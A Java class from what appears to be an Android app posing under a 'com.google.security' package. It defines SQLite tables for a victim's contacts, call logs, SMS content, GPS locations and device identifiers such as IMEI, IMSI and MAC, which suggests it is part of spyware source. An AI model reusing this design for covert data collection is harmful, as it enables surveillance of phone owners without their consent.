package com.google.security;

/*数据库信息*/
public class SQLLocalStorage {
	public static final String DB_MESSAGE = "message.db";
	public static final String TBL_CONTACTS = "contactsmessage";
	public static final String TBL_RECORD = "callrecordmessage";
	public static final String TBL_SMS = "smsmessage";
	public static final String TBL_LOCATION = "location";
	public static final String TBL_INFO = "states";
	public static final String CREATE_TBL_INFO = " create table "
			+ " states (_id integer primary key autoincrement,flag text,number text,models text,versions text,uid text,imei text,imsi text,networktype text,mac text,online text) ";
	public static final String CREATE_TBL_CONTACTS = " create table "
			+ TBL_CONTACTS
			+ "(_id integer ,name text,number text primary key,flag text) ";
	public static final String CREATE_TBL_RECORD = " create table "
			+ TBL_RECORD
			+ "(_id integer ,name text,number text,time text primary key,duration text,type text,flag text) ";
	public static final String CREATE_TBL_SMS = " create table "
			+ TBL_SMS
			+ "(_id integer ,name text,number text,content text,data text primary key,type text,flag text) ";
	public static final String CREATE_TBL_LOCATION = " create table "
			+ " location (_id integer primary key autoincrement,uid text,time text,addre text,lo float,la float,flag text) ";
}